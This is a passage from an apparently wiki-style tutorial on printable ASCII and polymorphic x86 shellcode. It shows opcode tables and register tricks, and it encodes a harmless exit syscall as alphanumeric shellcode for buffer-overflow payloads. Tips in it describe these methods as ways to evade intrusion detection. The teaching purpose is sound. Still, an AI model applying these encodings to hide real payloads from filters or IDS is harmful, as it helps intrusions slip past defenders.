  <span class="kw1">push</span> <span class="kw3">eax</span>			        pushl <span class="sy0">%</span><span class="kw3">eax</span>
  <span class="kw1">push</span> <span class="kw3">edx</span>			        pushl <span class="sy0">%</span><span class="kw3">edx</span>
  <span class="kw1">push</span> <span class="kw3">ecx</span>			        pushl <span class="sy0">%</span><span class="kw3">ecx</span>
  <span class="kw1">pop</span> <span class="kw3">eax</span>				popl <span class="sy0">%</span><span class="kw3">eax</span>
  <span class="kw1">pop</span> <span class="kw3">ecx</span>				popl <span class="sy0">%</span><span class="kw3">ecx</span>
  <span class="kw1">pop</span> <span class="kw3">edx</span>				popl <span class="sy0">%</span><span class="kw3">edx</span>
  <span class="kw1">push</span> <span class="kw3">ecx</span>			        pushl <span class="sy0">%</span><span class="kw3">ecx</span>
  <span class="kw1">push</span> <span class="kw3">eax</span>			        pushl <span class="sy0">%</span><span class="kw3">eax</span>
  <span class="kw1">push</span> <span class="kw3">edx</span>			        pushl <span class="sy0">%</span><span class="kw3">edx</span>
  <span class="kw1">pop</span> <span class="kw3">eax</span>				popl <span class="sy0">%</span><span class="kw3">eax</span>
  <span class="kw1">pop</span> <span class="kw3">edx</span>				popl <span class="sy0">%</span><span class="kw3">edx</span>
  <span class="kw1">pop</span> <span class="kw3">ecx</span>				popl <span class="sy0">%</span><span class="kw3">ecx</span></pre></div></div>
</td></tr></table>
<p>As far as the INC/DEC <a href="/Assembly_Basics#Instructions_.26_Concepts" title="Assembly Basics" class="mw-redirect">instructions</a> are concerned, <a href="/Shellcode" title="Shellcode" class="mw-redirect">shellcode</a> like <b>ACBKJI</b> leave the&#160;%ecx,&#160;%edx, and&#160;%ebx registers completely unchanged.  Therefore any register can be incremented any number of times so long as the register is decremented the same amount.
</p>
<div style="padding: .2em .3em; margin: .2em .2em; background-color: #98AFC7; border: solid 1px #25383C; font-size: 107%;"><strong>Protip:</strong> INC and DEC use only half a cpu cycle or less depending on CPU architecture and are usually the highest performing instructions of those which are available.  Using multiple combinations and implementations of this concept will yield a maximum IDS evasive effect.</div>
<p><br />
</p>
<h2> <span class="mw-headline" id="Basic_Encoding"> Basic Encoding </span></h2>
<p>Though there aren't many instructions available in the printable character space, there are still enough instructions to manipulate the values of multiple registers and the stack
</p>
<h3> <span class="mw-headline" id="Single_Byte_Register_Manipulation"> Single Byte Register Manipulation </span></h3>
<p>Using only ASCII, the smallest method to zero out the&#160;%eax register is five bytes, <b>jXX4X</b>, examined below:
</p>
<table class="wikitable">
<tr>
<th> Ascii
</th>
<th> <a href="/Machine_code" title="Machine code">Machine Code</a>
</th>
<th> <a href="/Assembly_Basics" title="Assembly Basics" class="mw-redirect">Assembly</a>
</th></tr>
<tr>
<td> jX
</td>
<td> \x6a\x58
</td>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="kw1">push</span> <span class="kw5">byte</span> <span class="nu0">0x58</span></pre></div></div>
</td></tr>
<tr>
<td> X
</td>
<td> \x58
</td>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="kw1">pop</span> <span class="kw3">eax</span></pre></div></div>
</td></tr>
<tr>
<td> 4X
</td>
<td> \x34\x58
</td>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="kw1">xor</span> <span class="kw3">al</span><span class="sy0">,</span> <span class="nu0">58</span></pre></div></div>
</td></tr></table>
<div style="padding: .2em .3em; margin: .2em .2em; background-color: #98AFC7; border: solid 1px #25383C; font-size: 107%;"><strong>Protip:</strong> Looking back to the explanation of the <b>eax</b> register, it can be seen that the <b>al</b> register is the last <a href="/Byte" title="Byte">byte</a> of <b>eax</b>.</div>
<ul><li> Reviewing that five-byte combination line by line:
</li></ul>
<table class="wikitable">
<tr>
<th> <a href="/Assembly_Basics" title="Assembly Basics" class="mw-redirect">Assembly</a>.
</th>
<th> Action
</th></tr>
<tr>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="kw1">push</span> <span class="nu0">0x58</span></pre></div></div>
</td>
<td> pushes 58000000 onto the stack
</td></tr>
<tr>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="kw1">pop</span> <span class="kw3">eax</span></pre></div></div>
</td>
<td> pops eax, sets eax to 0x00 00 00 58
</td></tr>
<tr>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="kw1">xor</span> <span class="kw3">al</span><span class="sy0">,</span> <span class="nu0">58</span></pre></div></div>
</td>
<td> because al = 58, al now = 00, making eax = 0x00000000
</td></tr></table>
<h3> <span class="mw-headline" id="Reviewing_XOR"> Reviewing XOR </span></h3>
<p><a href="/Bitwise_Math#3.4_-_XOR" title="Bitwise Math" class="mw-redirect">XOR</a> (<b>exclusive OR</b>) can sometimes be a serious inconvenience to developers due to the time consuming and tedious nature of xor-encoding by hand.  The XOR instruction performs a <a href="/Bitwise_Math" title="Bitwise Math" class="mw-redirect">Bitwise Operation</a> on two values.  If the bits are the same, then the corresponding or respective bit is reset to 0.  If the two bits are different, then the corresponding or respective bit is set to 1.  For example, <b>F xor 3</b>:
</p>
<pre> 1111 F xor
 0011 3 &#x3d;
 ------------
 1100 C
</pre>
<p>Any time something is XOR'd with itself, it becomes zero.
</p>
<table class="wikitable">
<tr>
<th> Example A
</th>
<th> Example B
</th></tr>
<tr>
<td> 1111 F xor<br />1111 F =<br />----------<br />0000 0
</td>
<td> 1001 9 xor<br />1001 9 =<br />----------<br />0000 0
</td></tr></table>
<h3> <span class="mw-headline" id="DWORD_Manipulation"> DWORD Manipulation </span></h3>
<p>Using printable ASCII as <a href="/Machine_code" title="Machine code">machine code</a> one can <b>PUSH</b> registers, <b>POP</b> registers, <b>PUSH</b> <a href="/Assembly_Basics#Instructions_.26_Concepts" title="Assembly Basics" class="mw-redirect">DWORD and byte values</a>, and <b>XOR them</b>.
</p>
<ul><li> Some of the more important printable instructions include:
</li></ul>
<table class="wikitable">
<tr>
<th> Ascii
</th>
<th> <a href="/Machine_code" title="Machine code">Machine Code</a>/<a href="/Assembly_Basics#Counting" title="Assembly Basics" class="mw-redirect">hex</a>
</th>
<th> Assembly
</th>
<th> Operand Size
</th></tr>
<tr>
<td> h
</td>
<td> \x68
</td>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="kw1">push</span> 0x########</pre></div></div>
</td>
<td> DWORD
</td></tr>
<tr>
<td> 5
</td>
<td> \x35
</td>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="kw1">xor</span> <span class="kw3">eax</span><span class="sy0">,</span> 0x########</pre></div></div>
</td>
<td> DWORD
</td></tr>
<tr>
<td> 4
</td>
<td> \x34
</td>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="kw1">xor</span> <span class="kw3">al</span><span class="sy0">,</span> 0x##</pre></div></div>
</td>
<td> BYTE
</td></tr>
<tr>
<td> X
</td>
<td> \x58
</td>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="kw1">pop</span> <span class="kw3">eax</span></pre></div></div>
</td>
<td> No Operands
</td></tr>
<tr>
<td> j
</td>
<td> \x6a
</td>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="kw1">push</span> 0x##</pre></div></div>
</td>
<td> BYTE
</td></tr>
<tr>
<td> Q
</td>
<td> \x51
</td>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="kw1">push</span> <span class="kw3">ecx</span></pre></div></div>
</td>
<td> No Operands
</td></tr>
<tr>
<td> P
</td>
<td> \x50
</td>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="kw1">push</span> <span class="kw3">eax</span></pre></div></div>
</td>
<td> No Operands
</td></tr>
<tr>
<td> Y
</td>
<td> \x59
</td>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="kw1">pop</span> <span class="kw3">ecx</span></pre></div></div>
</td>
<td> No Operands
</td></tr>
<tr>
<td> Z
</td>
<td> \x5a
</td>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="kw1">pop</span> <span class="kw3">edx</span></pre></div></div>
</td>
<td> No Operands
</td></tr></table>
<ul><li> So, a small example of ASCII to modify the entire DWORD value of the <b>eax</b> register and set the register value to zero is <b>hLULZX5LULZ</b>:
</li></ul>
<table class="wikitable">
<tr>
<th> Ascii
</th>
<th> <a href="/Machine_code" title="Machine code">Machine Code</a>
</th>
<th> <a href="/Assembly_Basics" title="Assembly Basics" class="mw-redirect">Assembly</a>
</th></tr>
<tr>
<td> hLULZ
</td>
<td> \x68\x4c\x55\x4c\x5a
</td>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="kw1">push</span> <span class="nu0">0x5a4c554c</span></pre></div></div>
</td></tr>
<tr>
<td> X
</td>
<td> \x58
</td>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="kw1">pop</span> <span class="kw3">eax</span></pre></div></div>
</td></tr>
<tr>
<td> 5LULZ
</td>
<td> \x35\x4c\x55\x4c\x5a
</td>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="kw1">xor</span> <span class="kw3">eax</span><span class="sy0">,</span> <span class="nu0">0x5a4c554c</span></pre></div></div>
</td></tr></table>
<ul><li> And the DWORD <b>eax</b> register has been manipulated and set to 0 in <b>11 bytes</b>.  
</li></ul>
<div style="padding: .2em .3em; margin: .2em .2em; background-color: #98AFC7; border: solid 1px #25383C; font-size: 107%;"><strong>Protip:</strong> By manipulating the eax register and then pushing it to the stack, its value can be popped into other registers so that the value may be preserved, or so that other registers may be used as necessary.</div>
<p><br />
</p>
<h2> <span class="mw-headline" id="Introduction_to_Polymorphic_Ascii_Shellcode"> Introduction to Polymorphic Ascii Shellcode </span></h2>
<p><a href="/Polymorphic" title="Polymorphic">Polymorphic</a> code refers to a piece of code's ability to change itself.  <a href="/Machine_code" title="Machine code">Machine code</a> can modify itself through any of the functions which allow modification of registers and the stack.  Self-modifying code is generally used to prevent the reverse-engineer from understanding the code.  This method of code obfuscation is quite common and is considered a standard in most targeted exploitations.}}Due to the nature of <a href="/Assembly_Basics#The_Stack" title="Assembly Basics" class="mw-redirect">the stack</a> and the x86 architecture, <b>the stack grows backwards, but executes forwards</b>.
</p><p>During the first instruction of a buffer overflow payload's execution, the <b>esp register</b> points to the top of the stack that was overflowed.  By manipulating this register properly during shellcode execution, code within the context of the currently executing buffer can be modified or overwritten.  To apply this concept to polymorphic <a href="/Shellcode" title="Shellcode" class="mw-redirect">shellcode</a>, the esp register must be pointing to a location in the stack ahead of the code currently executing.  Because the stack grows backwards, pushed bytes will be written in front of the code being executed, and the code executing will eventually hit the <a href="/Byte" title="Byte">bytes</a> of <a href="/Machine_code" title="Machine code">machine code</a> pushed to the stack.
</p><p><i>Without ASCII limitations, there are several instructions, or "modifiers" that can be used for the morphing.  Generally, any instruction that can be used to modify the value of a register, in relation to itself (anything other than moving a value into a register) is considered a modifier.  Modifiers, including ASCII modifiers, are as follows:</i>
</p>
<table class="wikitable" width="100%">
<tr>
<td>
<ul><li>add
</li><li>sub
</li><li>dec
</li><li>inc
</li><li>xor
</li><li>or
</li><li>and
</li><li>not
</li><li>imul
</li><li>idiv
</li><li>shl
</li><li>shr
</li><li>ror
</li><li>rol
</li><li>insb
</li><li>outsb
</li></ul>
</td></tr></table>
<div style="padding: .2em .3em; margin: .2em .2em; background-color: #FFF6BF; border: solid 2px #FFD324; font-size: 107%;"><b>Notice:</b> This article will only cover printable ascii polymorphic code.</div>
<h3> <span class="mw-headline" id="Pushing_Nops">Pushing Nops</span></h3>
<p>The goal is to decode binary ahead of the currently executing printable ascii code.  Whenever a register is popped from the stack, the esp has 4 bytes added to its pointer.  When the <b>popad</b> or <b>popa</b> instruction is used,&#160;%esp has 32 bytes added to its pointer, as 8 registers are popped off the stack at once.  Likewise, push and pop of single registers subtract and add <b>4</b> to the value of the stack pointer (%esp), respectively.
</p><p>Suppose one wanted to use the <b>eax</b> register, set it to all NOPs (<b>0x90</b>) and push it onto the stack, using nothing but ASCII. The <b>\x90</b> opcode cannot be used, because the <b>\x90</b> code does not live in the ASCII keyspace.  Obviously this isn't very useful, but the concept is the important part.  A very basic polymorphic code is how <b>0x90909090</b> will be pushed onto the stack without referencing the actual value <b>0x90</b> a single time.  In the shortest amount of bytes possible, the <a href="/Shellcode" title="Shellcode" class="mw-redirect">shellcode</a> to do so is <b>jFX4FH5ooooP</b> (<b>12 bytes</b>), analyzing that:
</p>
<table class="wikitable">
<tr>
<th> <b>Ascii</b>
</th>
<th> <b><a href="/Machine_code" title="Machine code">Machine Code</a></b>
</th>
<th> <b>Assembly</b>
</th></tr>
<tr>
<td> jF
</td>
<td> \x6a\x46
</td>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1">pushb $<span class="nu0">0x46</span></pre></div></div>
</td></tr>
<tr>
<td> X
</td>
<td> \x58
</td>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="kw1">pop</span> <span class="sy0">%</span><span class="kw3">eax</span></pre></div></div>
</td></tr>
<tr>
<td> 4F
</td>
<td> \x34\x46
</td>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="kw1">xor</span> $<span class="nu0">0x46</span><span class="sy0">,</span> <span class="sy0">%</span><span class="kw3">al</span></pre></div></div>
</td></tr>
<tr>
<td> H
</td>
<td> \x48
</td>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1">decl <span class="sy0">%</span><span class="kw3">eax</span></pre></div></div>
</td></tr>
<tr>
<td> 5oooo
</td>
<td> \x35\x6f\x6f\x6f\x6f
</td>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1">xorl $<span class="nu0">0x6f6f6f6f</span><span class="sy0">,</span> <span class="sy0">%</span><span class="kw3">eax</span></pre></div></div>
</td></tr>
<tr>
<td> P
</td>
<td> \x50
</td>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1">pushl <span class="sy0">%</span><span class="kw3">eax</span></pre></div></div>
</td></tr></table>
<p>If this is still confusing, this is further breakdown, following the&#160;%eax register, in both common assembly syntaxes:
</p>
<table class="wikitable">
<tr>
<th> <b>ATT SystemV Assembly</b>
</th>
<th> <b>Intel Assembly</b>
</th>
<th> <b>Value of eax register</b>
</th></tr>
<tr>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1">pushb $<span class="nu0">0x46</span></pre></div></div>
</td>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="kw1">push</span> <span class="nu0">0x46</span></pre></div></div>
</td>
<td>
</td></tr>
<tr>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="kw1">pop</span> <span class="sy0">%</span><span class="kw3">eax</span></pre></div></div>
</td>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="kw1">pop</span> <span class="kw3">eax</span></pre></div></div>
</td>
<td> 0x00000046
</td></tr>
<tr>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1">xorb $<span class="nu0">0x46</span><span class="sy0">,</span> <span class="sy0">%</span><span class="kw3">al</span></pre></div></div>
</td>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="kw1">xor</span> <span class="kw3">al</span><span class="sy0">,</span> <span class="nu0">0x46</span></pre></div></div>
</td>
<td> 0x00000000
</td></tr>
<tr>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1">decl <span class="sy0">%</span><span class="kw3">eax</span></pre></div></div>
</td>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="kw1">dec</span> <span class="kw3">eax</span></pre></div></div>
</td>
<td> 0xffffffff
</td></tr>
<tr>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1">xorl $<span class="nu0">0x6f6f6f6f</span><span class="sy0">,</span> <span class="sy0">%</span><span class="kw3">eax</span></pre></div></div>
</td>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="kw1">xor</span> <span class="kw3">eax</span><span class="sy0">,</span> <span class="nu0">0x6f6f6f6f</span></pre></div></div>
</td>
<td> 0x90909090
</td></tr>
<tr>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1">pushl <span class="sy0">%</span><span class="kw3">eax</span></pre></div></div>
</td>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="kw1">push</span> <span class="kw3">eax</span></pre></div></div>
</td>
<td>
</td></tr></table>
<p>There are two things happening here which haven't been covered thoroughly.  The first one of these is the <b>dec eax</b>, or the <b>\x48</b> instruction. Usually, <b>dec</b> simply decrements the affected register.  However, when that register is already equal to <b>0x00000000</b>, <b>dec</b> will underflow and set the register to <b>0xffffffff</b>.  The second thing is the XOR instruction.  The XOR instruction in the above code does an <b>exclusive or</b> as follows:
</p>
<pre> 0xffffffff xor
 0x6f6f6f6f
</pre>
<p><br />
And stores the value in <b>eax</b>, then PUSHes eax. This is a nybble by nybble, <a href="/Byte" title="Byte">byte</a> by <a href="/Byte" title="Byte">byte</a> following of the exclusive or instruction:
</p>
<pre> 1111	1111	1111	1111	1111	1111	1111	1111	(FFFFFFFF) xor
 0110	1111	0110	1111	0110	1111	0110	1111	(6F6F6F6F) =
 ----	----	----	----	----	----	----	----	--------------
 1001	0000	1001	0000	1001	0000	1001	0000	(90909090)
</pre>
<p>Polymorphic code should consist of methods which place a random or comment value into a register, and then XOR the register until the desired value has been reached.  The register value can be started at any ASCII value, <b>0x00000000</b>, or <b>0xffffffff</b>, by XORing a register with itself, or by setting the register value to zero and then decrementing it.
</p><p>Notice that this <a href="/Shellcode" title="Shellcode" class="mw-redirect">shellcode</a> is <b>100% alphanumeric</b>.  There is of course, non-ASCII and non-alphanumeric polymorphic code, which has much less inhibitions than printable ASCII or alpha-numeric bytecode.
</p>
<h3> <span class="mw-headline" id="A_sequence_for_exit">A sequence for exit</span></h3>
<p>In linux/x86 the exit interrupt is pretty straight forward:
</p>
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="sy0">.</span>section <span class="kw4">.data</span>
<span class="sy0">.</span>section <span class="sy0">.</span>text
<span class="sy0">.</span>globl _start
_start<span class="sy0">:</span>
 xorl <span class="sy0">%</span><span class="kw3">eax</span><span class="sy0">,</span> <span class="sy0">%</span><span class="kw3">eax</span>
 incl <span class="sy0">%</span><span class="kw3">eax</span>
 xorl <span class="sy0">%</span><span class="kw3">ebx</span><span class="sy0">,</span> <span class="sy0">%</span><span class="kw3">ebx</span>
 <span class="kw1">int</span> $<span class="nu0">0x80</span></pre></div></div>
</td></tr></table>
<p>If testing , put the contents of the above code box into a textfile named <b>exit.s</b>.  Then run the following commands in the <a href="/Bash" title="Bash">bash</a> prompt:
</p>
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="bash source-bash"><pre class="de1"><span class="kw2">as</span> exit.s <span class="re5">--32</span> <span class="re5">-o</span> exit.o&#160;; <span class="kw2">ld</span> exit.o <span class="re5">-o</span> <span class="kw3">exit</span>&#160;; .<span class="sy0">/</span><span class="kw3">exit</span></pre></div></div>
</td></tr></table>
<ul><li> exit executes without crashing due to segmentation fault or anything of that nature.  The above code sets the interrupt call (the&#160;%eax register) to <b>1</b> (the exit function's kernel interrupt), and the exit code (%ebx register) to <b>0</b>, which you can see by doing the following:
</li></ul>
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="bash source-bash"><pre class="de1">.<span class="sy0">/</span><span class="kw3">exit</span>&#160;; <span class="kw3">echo</span> <span class="re4">$?</span></pre></div></div>
</td></tr></table>
<ul><li> The exit code "3" is going to be used for the example of polymorphism, it will be able to see if the shellcode properly executed.  The following code will be used:
</li></ul>
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="sy0">.</span>section <span class="kw4">.data</span>
<span class="sy0">.</span>section <span class="sy0">.</span>text
<span class="sy0">.</span>globl _start
_start<span class="sy0">:</span>
 xorl <span class="sy0">%</span><span class="kw3">eax</span><span class="sy0">,</span> <span class="sy0">%</span><span class="kw3">eax</span>
 incl <span class="sy0">%</span><span class="kw3">eax</span>
 movl $<span class="nu0">3</span><span class="sy0">,</span> <span class="sy0">%</span><span class="kw3">ebx</span>
 <span class="kw1">int</span> $<span class="nu0">0x80</span></pre></div></div>
</td></tr></table>
<ul><li> Go ahead and re-assemble and execute this, testing for the exit code:
</li></ul>
<table class="wikitable" width="100%">
<tr>
<td>
<p>[user@host ~]$ echo $?
</p><p>3
</p>
</td></tr></table>
<h3> <span class="mw-headline" id="From_assembling_to_machine_code">From assembling to <a href="/Machine_code" title="Machine code">machine code</a></span></h3>
<p>To get shellcode for the <a href="#A_sequence_for_exit">exit sequence</a>, one can use the <b>objdump</b> command line <a href="/Bash" title="Bash">bash</a> utility:
</p>
<table class="wikitable" width="100%">
<tr>
<td>
<p>[user@host ~]$ objdump -d exit
</p>
<pre>
exit:     file format elf64-x86-64

Disassembly of section .text:

0000000000400078 &lt;_start&gt;:
  400078:       31 c0                   xor   &#160;%eax,%eax
  40007a:       ff c0                   inc   &#160;%eax
  40007c:       bb 03 00 00 00          mov    $0x3,%ebx
  400081:       cd 80                   int    $0x80
</pre>
</td></tr></table>
<ul><li> Objdump did a decent favor here - breaking the output into table format:
</li></ul>
<table class="wikitable">
<tr>
<th> Memory Address
</th>
<th> <a href="/Machine_code" title="Machine code">Machine Code</a>
</th>
<th> <a href="/Assembly_Basics" title="Assembly Basics" class="mw-redirect">Assembly</a>
</th></tr>
<tr>
<td> 400078
</td>
<td> 31 c0
</td>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="kw1">xor</span> <span class="sy0">%</span><span class="kw3">eax</span><span class="sy0">,%</span><span class="kw3">eax</span></pre></div></div>
</td></tr>
<tr>
<td> 40007a
</td>
<td> ff c0
</td>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="kw1">inc</span> <span class="sy0">%</span><span class="kw3">eax</span></pre></div></div>
</td></tr>
<tr>
<td> 40007c
</td>
<td> bb 03 00 00 00
</td>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="kw1">mov</span> $<span class="nu0">0x3</span><span class="sy0">,%</span><span class="kw3">ebx</span></pre></div></div>
</td></tr>
<tr>
<td> 400081
</td>
<td> cd 80
</td>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="kw1">int</span> $<span class="nu0">0x80</span></pre></div></div>
</td></tr></table>
<ul><li> It can be easily determined that the <b><a href="/Machine_code" title="Machine code">machine code</a> for this is "\x31\xc0\xff\xc0\xbb\x03\x00\x00\x00\xcd\x80"</b>
</li></ul>
<p>Examining the assembly and shellcode further, because eax and ebx can be easily manipulated, the real challenge here is getting "\xcd\x80" onto the stack.  It's also positioned first, since it is executed last.  Closer examination will also reveal one need not push the other instructions, so long as the values of&#160;%ebx and&#160;%eax are sound when the kernel interrupt is called.  So, because "\xcd\x80" is <b>two bytes</b>, or a <b>word</b>, <b>0x66</b> (or <b>f</b> in alpha) instruction prefix will have to be used to force a 16-bit operand size in conjunction with the <b>0x35</b> xor dword instruction.  Though, something that when XOR'd with 0xcd80 still needs to be found in the printable character space (between <b>0x30</b> and <b>0x7a</b>).
</p>
<h3> <span class="mw-headline" id="Converting_Exit_to_Printable_Ascii">Converting Exit to Printable Ascii</span></h3>
<p>The following needs to be kept in mind when converting the exit shellcode to ascii:
</p>
<table class="wikitable" width="100%">
<tr>
<td>
<ul><li> For successful exploitation, a trick from the ascii <b>nop</b> example will need to be used to get <b>eax</b> to <b>0xffffffff</b>.
</li><li> The target is <b>????80cd</b>, because it must go onto the stack backwards
</li><li> The first two bytes will be completely irrelevent, as they will occur in the stack <b>after</b> the kernel interrupt for exit.
</li><li> The <b>%eax</b> register must equal the value '1' when the interrupt is called.
</li><li> The <b>%ebx</b> register must equal the decimal value '3' or hexidecimal value <b>0x03</b> when the interrupt is called.
</li></ul>
</td></tr></table>
<h4> <span class="mw-headline" id="eax_.26_ebx">eax &amp; ebx</span></h4>
<p>Taking a look at&#160;%ebx, it's value will need to be set to <b>0x03</b>.  The best way it can be done is by manipulating the&#160;%eax register, then pushing the eax register and popping the value back into&#160;%ebx.  The following code can do this:
</p>
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1">pushb $<span class="nu0">0x30</span>
<span class="kw1">pop</span> <span class="sy0">%</span><span class="kw3">eax</span>
xorb $<span class="nu0">0x33</span><span class="sy0">,</span> <span class="sy0">%</span><span class="kw3">al</span>
pushl <span class="sy0">%</span><span class="kw3">eax</span>
<span class="kw1">pop</span> <span class="sy0">%</span><span class="kw3">ebx</span></pre></div></div>
</td></tr></table>
<p>%ebx and&#160;%eax are both 3. The&#160;%eax register can simply be decremented twice (<b>H</b> in alpha) to get to the value of '1':
</p><p>When analyzed:
</p>
<table class="wikitable">
<tr>
<th> <a href="/Assembly_Basics" title="Assembly Basics" class="mw-redirect">Assembly</a>
</th>
<th> <a href="/Machine_code" title="Machine code">Machine Code</a>
</th>
<th> Ascii
</th></tr>
<tr>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1">pushb $<span class="nu0">0x30</span></pre></div></div>
</td>
<td> \x6a\x30
</td>
<td> j0
</td></tr>
<tr>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="kw1">pop</span> <span class="sy0">%</span><span class="kw3">eax</span></pre></div></div>
</td>
<td> \x58
</td>
<td> X
</td></tr>
<tr>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="kw1">xor</span> $<span class="nu0">0x33</span><span class="sy0">,</span> <span class="sy0">%</span><span class="kw3">al</span></pre></div></div>
</td>
<td> \x34\x33
</td>
<td> 43
</td></tr>
<tr>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1">pushl <span class="sy0">%</span><span class="kw3">eax</span></pre></div></div>
</td>
<td> \x50
</td>
<td> P
</td></tr>
<tr>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="kw1">pop</span> <span class="sy0">%</span><span class="kw3">ebx</span></pre></div></div>
</td>
<td> \x5b
</td>
<td> [
</td></tr>
<tr>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1">decl <span class="sy0">%</span><span class="kw3">eax</span></pre></div></div>
</td>
<td> \x48
</td>
<td> H
</td></tr>
<tr>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1">decl <span class="sy0">%</span><span class="kw3">eax</span></pre></div></div>
</td>
<td> \x48
</td>
<td> H
</td></tr></table>
<ul><li> The ascii code for this manipulation of the&#160;%eax and&#160;%ebx registers looks like "<b>j0X43P[HH</b>".
</li></ul>
<h4> <span class="mw-headline" id="The_Kernel_Interrupt"> The Kernel Interrupt </span></h4>
<p>This next part is a bit more difficult.  \xcd\x80 needs to be constructed on the stack.  First, zeroing out the eax register, and decrementing it to get <b>0xffffffff</b>:
</p>
<table class="wikitable">
<tr>
<th> Assembly
</th>
<th> Ascii
</th></tr>
<tr>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1">pushb $<span class="nu0">0x6a</span></pre></div></div>
</td>
<td> jj
</td></tr>
<tr>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1"><span class="kw1">pop</span> <span class="sy0">%</span><span class="kw3">eax</span></pre></div></div>
</td>
<td> X
</td></tr>
<tr>
<td> <div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="asm source-asm"><pre class="de1">xorb $<span class="nu0">0x6a</span><span class="sy0">,</span> <span class="sy0">%</span><span class="kw3">al</span></pre></div></div>
</td>
<td> 4j
</td></tr>
<tr>
